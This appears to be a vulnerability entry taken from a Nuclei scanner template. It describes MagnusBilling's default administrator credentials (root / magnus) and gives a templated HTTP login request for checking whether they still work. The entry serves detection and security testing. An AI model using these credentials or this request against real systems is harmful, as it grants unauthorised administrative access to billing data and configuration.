# Vulnerability: MagnusBilling - Default Login
**Classification:** MBILLING
**Source:** Nuclei Template (`magnusbilling-default-login.yaml`)

## Description
MagnusBilling installs with a default administrative account using the credentials root / magnus. If unchanged, these credentials grant full access to the system, allowing attackers to manage billing data, modify configurations, and potentially execute arbitrary code or commands via exposed interfaces.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /mbilling/index.php/authentication/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

user={{username}}&password={{password}}&key=
```

